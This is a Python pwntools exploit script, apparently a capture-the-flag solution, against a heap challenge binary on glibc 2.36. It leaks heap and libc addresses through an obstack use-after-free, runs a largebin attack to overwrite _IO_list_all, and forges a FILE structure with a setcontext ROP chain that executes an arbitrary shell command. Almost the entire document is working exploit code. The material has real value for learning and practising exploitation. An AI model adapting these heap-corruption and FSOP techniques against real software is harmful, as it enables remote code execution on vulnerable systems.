#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import subprocess

from pwn import ELF, context, log, p32, p64, process, remote, u64, args


HOST = "ctf.csd.lol"
PORT = 2024

POW_RE = re.compile(rb"sh -s ([^\s]+)")

# Obstack default chunk user size in this binary (malloc chunk size is 0xff0).
OBSTACK_CHUNK_USER_SZ = 0xFE0

# glibc 2.36 (provided libc.so.6)
UNSORTED_MAIN_ARENA_FD_OFF = 0x1D3CC0
IO_LIST_ALL_OFF = 0x1D4660
IO_WFILE_JUMPS_OFF = 0x1D00A0
MXCSR_DEFAULT = 0x1F80


def solve_pow(io) -> None:
    banner = io.recvuntil(b"solution: ")
    m = POW_RE.search(banner)
    if not m:
        raise ValueError(f"PoW token not found in: {banner!r}")
    token = m.group(1).decode()
    solution = subprocess.check_output(["./redpwnpow", token]).strip()
    io.sendline(solution)


def u64leak(data: bytes) -> int:
    return u64(data.ljust(8, b"\x00"))


class TheFinalRCE:
    def __init__(self, io):
        self.io = io
        self._sync()

    def _sync(self) -> None:
        # Sync on the full menu tail to avoid stopping early on leaked bytes containing b"> ".
        self.io.recvuntil(b"0) exit\n> ")

    def alloc(self, idx: int, size: int, data: bytes = b"") -> None:
        if size and not data:
            raise ValueError("alloc(size>0) requires data")
        payload = f"1\n{idx}\n{size}\n".encode()
        if size:
            payload += data
        self.io.send(payload)
        self._sync()

    def free(self, idx: int) -> None:
        self.io.send(f"2\n{idx}\n".encode())
        self._sync()

    def edit(self, idx: int, data: bytes) -> None:
        self.io.send(f"3\n{idx}\n".encode())
        self.io.recvuntil(b"data: ")
        self.io.send(data)
        self._sync()

    def show(self, idx: int) -> bytes:
        self.io.send(f"4\n{idx}\n".encode())
        self.io.recvuntil(b"data: ")
        data_and_nl = self.io.recvuntil(b"1) alloc\n", drop=True)
        self._sync()
        if data_and_nl.endswith(b"\n"):
            data_and_nl = data_and_nl[:-1]
        return data_and_nl


def leak_chunk_limit(pwn: TheFinalRCE, anchor_idx: int, move_idx: int, base_idx: int) -> int:
    pwn.free(anchor_idx)
    pwn.alloc(move_idx, 0xFFFF_FFF0, b"X")  # -0x10 => chunk base
    pwn.alloc(base_idx, 0, b"")
    leak = pwn.show(base_idx)
    if leak:
        return u64leak(leak)

    # Rare: chunk->limit starts with NUL bytes so puts() prints empty; brute leading NULs.
    recovered = None
    for n in range(1, 8):
        pwn.free(anchor_idx)
        pwn.alloc(move_idx, 0xFFFF_FFF0, b"X")
        pwn.alloc(base_idx, n, b"A" * n)
        leak2 = pwn.show(base_idx)
        if len(leak2) > n:
            recovered = u64leak((b"\x00" * n) + leak2[n:])
            pwn.free(anchor_idx)
            pwn.alloc(move_idx, 0xFFFF_FFF0, b"X")
            pwn.alloc(base_idx, n, b"\x00" * n)
            break
    if recovered is None:
        raise ValueError("Failed to leak chunk->limit")
    return recovered


def leak_obstack_chunk(pwn: TheFinalRCE, anchor_idx: int, move_idx: int, base_idx: int) -> tuple[int, int, int]:
    limit = leak_chunk_limit(pwn, anchor_idx=anchor_idx, move_idx=move_idx, base_idx=base_idx)
    base = limit - OBSTACK_CHUNK_USER_SZ
    header = base - 0x10
    return base, header, limit


def build_fsop_payload(libc: ELF, b_header: int, cmd: bytes) -> bytes:
    io_wfile_jumps = libc.address + IO_WFILE_JUMPS_OFF
    setcontext = libc.symbols["setcontext"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    pop_rdi_ret = next(libc.search(b"\x5f\xc3"))
    pop_rax_pop_rdx_pop_rbx_ret = next(libc.search(b"\x58\x5a\x5b\xc3"))
    syscall_ret = next(libc.search(b"\x0f\x05\xc3"))

    # Keep everything inside a 0x200 write to reduce partial-read risk.
    wide_data = b_header + 0x108
    wide_vtable = b_header + 0x188
    fenv = b_header + 0x1A0

    # ROP arguments live inside wide_data (which also becomes setcontext's RSP).
    argv = wide_data + 0x38
    arg_c = wide_data + 0x58
    cmd_addr = wide_data + 0x60

    # Keep cmd within the region before fenv to avoid clobbering setcontext's fldenv data.
    max_cmd_len = (fenv - cmd_addr) - 1
    if len(cmd) > max_cmd_len:
        raise ValueError(f"Command too long for payload region (max {max_cmd_len}, got {len(cmd)})")

    buf = bytearray(b"\x00" * 0x200)

    def q(off: int, val: int) -> None:
        buf[off : off + 8] = p64(val)

    def d(off: int, val: int) -> None:
        buf[off : off + 4] = p32(val)

    # _IO_FILE fields used by _IO_flush_all_lockp + _IO_wfile_overflow
    d(0x0, 0)  # _flags
    q(0x20, 0)  # _IO_write_base
    q(0x28, 1)  # _IO_write_ptr > _IO_write_base
    q(0x68, 0)  # _chain = NULL (stop _IO_flush_all_lockp list walk)
    q(0x70, argv)  # (_fileno,_flags2) (also setcontext rsi)
    q(0x88, 0)  # _lock (also setcontext rdx); _IO_cleanup calls flush_all_lockp(0)
    q(0xA0, wide_data)  # _wide_data (also setcontext rsp)
    q(0xA8, pop_rdi_ret)  # _freeres_list (also setcontext RIP/retaddr)
    d(0xC0, 0)  # _mode <= 0 => flush_all uses narrow write ptrs
    q(0xD8, io_wfile_jumps)  # vtable

    # setcontext requirements
    q(0xE0, fenv)  # [ctx+0xe0] -> fldenv ptr
    d(0x1C0, MXCSR_DEFAULT)  # [ctx+0x1c0] -> mxcsr

    # Fake wide_data (only fields needed before _IO_wdoallocbuf) and ROP stack.
    wide_off = wide_data - b_header
    # ROP chain: execve("/bin/sh", argv, NULL) via syscall.
    q(wide_off + 0x00, binsh)  # pop rdi; ret
    q(wide_off + 0x08, pop_rax_pop_rdx_pop_rbx_ret)
    q(wide_off + 0x10, 59)  # rax = __NR_execve
    q(wide_off + 0x18, 0)  # rdx = envp = NULL; also wide_data->_IO_write_base
    q(wide_off + 0x20, 0)  # rbx = 0
    q(wide_off + 0x28, syscall_ret)
    q(wide_off + 0x30, 0)  # wide_data->_IO_buf_base == 0

    # argv array: ["/bin/sh","-c",cmd,NULL]
    q((argv - b_header) + 0x00, binsh)
    q((argv - b_header) + 0x08, arg_c)
    q((argv - b_header) + 0x10, cmd_addr)
    q((argv - b_header) + 0x18, 0)

    # "-c" + command string
    buf[(arg_c - b_header) : (arg_c - b_header) + 3] = b"-c\x00"
    buf[(cmd_addr - b_header) : (cmd_addr - b_header) + len(cmd) + 1] = cmd + b"\x00"

    q(wide_off + 0xE0, wide_vtable)  # _wide_vtable (glibc 2.36)

    # Fake wide vtable: __doallocate at offset 0x68 (glibc 2.36)
    vt_off = wide_vtable - b_header
    q(vt_off + 0x68, setcontext)

    # Minimal fenv (28 bytes): set control word to 0x037f and tag word to 0xffff.
    fenv_off = fenv - b_header
    fenv_bytes = bytearray(b"\x00" * 0x1C)
    fenv_bytes[0:2] = b"\x7f\x03"
    fenv_bytes[4:6] = b"\xff\xff"
    buf[fenv_off : fenv_off + len(fenv_bytes)] = fenv_bytes

    return bytes(buf)


def main() -> None:
    context.binary = ELF("./chall")
    libc = ELF("./libc.so.6")
    context.log_level = os.environ.get("LOG", "info")

    if args.REMOTE:
        io = remote(HOST, PORT)
        solve_pow(io)
    else:
        io = process("./chall")

    pwn = TheFinalRCE(io)

    # ------------------- Phase 1: heap + libc leak via chunk A -------------------
    pwn.alloc(1, 0, b"")  # A anchor at A_base+0x10

    # Capture A base at idx 0 by moving object_base back by 0x10.
    pwn.alloc(9, 0xFFFF_FFF0, b"X")
    pwn.alloc(0, 0, b"")

    a_base, a_header, _ = leak_obstack_chunk(pwn, anchor_idx=1, move_idx=9, base_idx=0)
    a_anchor = a_base + 0x10
    log.info(f"A_base = {hex(a_base)}")

    # Persistent pointer for A fd_nextsize/bk_nextsize (at A_base+0x10).
    pwn.free(1)
    pwn.alloc(2, 0x10, b"A" * 0x10)

    # Shrink A: 0xff0 -> 0xf00, forge an in-use remainder (0xf0) to avoid top consolidation.
    pwn.free(1)
    pwn.alloc(3, 0xFFFF_FFE0, b"X")  # -0x20 => A_header
    pwn.alloc(4, 0x10, p64(0) + p64(0xF01))
    pwn.free(1)
    pwn.alloc(5, 0xEE0, b"X")  # (A_header+0xf00) - (A_anchor) = 0xee0
    pwn.alloc(6, 0x10, p64(0xF00) + p64(0xF1))

    # obstack_free(NULL): free A but keep UAF pointers.
    pwn.free(63)
    raw_unsorted = pwn.show(0)
    if not raw_unsorted:
        raise ValueError("Failed to leak unsorted fd (empty puts)")

    log.info(f"unsorted_raw_len = {len(raw_unsorted)}")
    unsorted_fd = u64leak(raw_unsorted)
    # puts() truncates on NUL; if the ASLR byte at +4 is 0, we only get 4 bytes.
    libc_base = None
    for fd_guess in (unsorted_fd, unsorted_fd | (0x7F << 40)):
        base_guess = fd_guess - UNSORTED_MAIN_ARENA_FD_OFF
        if (base_guess & 0xFFF) == 0 and (base_guess >> 40) == 0x7F:
            libc_base = base_guess
            break
    if libc_base is None:
        libc_base = unsorted_fd - UNSORTED_MAIN_ARENA_FD_OFF
    libc.address = libc_base
    log.info(f"libc_base = {hex(libc.address)}")

    # ------------------- Phase 2: largebin attack to overwrite _IO_list_all -------------------
    io_list_all = libc.address + IO_LIST_ALL_OFF

    # Force a new obstack chunk (B) so A (0xf00) moves unsorted -> largebin.
    pwn.alloc(10, 0x200, b"B")

    # Corrupt A's nextsize pointer so that inserting a smaller chunk writes to _IO_list_all.
    pwn.edit(2, p64(a_header) + p64(io_list_all - 0x20))

    # Leak B and detach it from the obstack chain (avoid freeing A again).
    b_base, b_header, b_limit = leak_obstack_chunk(pwn, anchor_idx=10, move_idx=11, base_idx=12)
    b_anchor = b_base + 0x10
    log.info(f"B_base = {hex(b_base)}")

    # Set B's struct _obstack_chunk.prev = NULL (field at B_base+8).
    pwn.free(10)
    pwn.alloc(17, 0xFFFF_FFF0, b"X")  # -0x10 => B_base
    pwn.alloc(18, 0x10, p64(b_limit) + p64(0))

    # Shrink B: 0xff0 -> 0xe00 (same largebin index as 0xf00)
    pwn.free(10)
    pwn.alloc(13, 0xFFFF_FFE0, b"X")  # -0x20 => B_header
    pwn.alloc(14, 0x10, p64(0) + p64(0xE01))
    pwn.free(10)
    pwn.alloc(15, (b_header + 0xE00 - b_anchor) & 0xFFFFFFFF, b"X")
    pwn.alloc(16, 0x10, p64(0xE00) + p64(0x1F1))

    # Free the whole obstack again: puts B (0xe00) into unsorted (only B gets freed due to prev=NULL).
    pwn.free(63)

    # Trigger malloc/newchunk: bins B into largebin next to A, performing the largebin write.
    try:
        pwn.alloc(30, 0x200, b"C")
    except Exception:
        try:
            extra = io.recvall(timeout=0.5)
            if extra:
                log.warning(f"extra output: {extra!r}")
        except Exception:
            pass
        raise

    # ------------------- Phase 3: FSOP from _IO_list_all -> fake FILE at B header -------------------
    c_base, _, _ = leak_obstack_chunk(pwn, anchor_idx=30, move_idx=31, base_idx=32)
    c_anchor = c_base + 0x10
    log.info(f"C_base = {hex(c_base)}")

    cmd = (
        str(args.CMD).encode()
        if args.CMD
        else b"cat flag* /flag 2>/dev/null"
    )
    payload = build_fsop_payload(libc, b_header=b_header, cmd=cmd)

    # Move the obstack object_base to B_header (UAF write) and write the fake FILE + wide structs.
    pwn.free(30)
    pwn.alloc(40, (b_header - c_anchor) & 0xFFFFFFFF, b"X")
    pwn.alloc(41, len(payload), payload)

    # Exit to trigger _IO_cleanup -> _IO_flush_all_lockp -> _IO_wfile_overflow -> setcontext -> execve.
    io.sendline(b"0")
    out = io.recvall(timeout=5)
    m = re.search(rb"[A-Za-z0-9_]{0,32}\\{[^\\n\\r]{8,200}\\}", out)
    if m:
        print(m.group(0).decode(errors="replace"))
    else:
        print(out.decode(errors="replace"))


if __name__ == "__main__":
    main()
